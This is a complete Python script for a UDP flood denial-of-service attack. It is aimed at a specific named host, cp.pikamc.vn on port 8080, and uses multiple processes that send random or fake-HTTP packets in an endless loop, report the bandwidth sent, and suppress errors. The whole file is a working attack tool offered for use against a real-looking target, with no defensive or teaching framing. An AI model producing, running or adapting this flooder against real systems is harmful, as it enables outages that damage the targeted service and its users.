import socket
import time
import os
import multiprocessing
import random

TARGET_IP = "cp.pikamc.vn"
TARGET_PORTS = [8080]
WORKERS = 1
PACKET_SIZE = 900     
PPS = 0                
MBPS = 0              
USE_HTTP = False       

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/118.0",
    "curl/8.1.2",
    "Wget/1.21.3 (linux-gnu)",
]

def make_http_payload():
    ua = random.choice(USER_AGENTS)
    if random.random() < 0.5:
        path = "/" + str(random.randint(1000, 9999))
        payload = f"GET {path} HTTP/1.1\r\nHost: test.local\r\nUser-Agent: {ua}\r\nAccept: */*\r\n\r\n"
    else:
        path = "/submit"
        body = f"data={os.urandom(8).hex()}"
        payload = (
            f"POST {path} HTTP/1.1\r\nHost: test.local\r\nUser-Agent: {ua}\r\n"
            f"Content-Length: {len(body)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{body}"
        )
    return payload.encode()


def worker(worker_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packets_sent = 0
    bytes_sent = 0
    start = time.time()

    while True:
        for port in TARGET_PORTS:
            try:
                if USE_HTTP:
                    payload = make_http_payload()
                else:
                    payload = os.urandom(PACKET_SIZE)

                sock.sendto(payload, (TARGET_IP, port))
                packets_sent += 1
                bytes_sent += len(payload)

            except Exception:
                pass

        now = time.time()
        elapsed = now - start
        if elapsed >= 1.0:
            mbps_out = (bytes_sent * 8) / (elapsed * 1024 * 1024)
            print(f"[Worker {worker_id}] Sent {packets_sent} pkts, {bytes_sent/1024:.2f} KB, {mbps_out:.2f} Mbps in {elapsed:.2f}s")
            packets_sent = 0
            bytes_sent = 0
            start = now

        if PPS > 0:
            time.sleep(1.0 / PPS)
        elif MBPS > 0:
            limit_bps = MBPS * 1024 * 1024
            if bytes_sent * 8 > limit_bps:
                time.sleep(0.001)


def main():
    jobs = []
    for i in range(WORKERS):
        p = multiprocessing.Process(target=worker, args=(i,))
        jobs.append(p)
        p.start()

    for p in jobs:
        p.join()


if __name__ == "__main__":
    main()
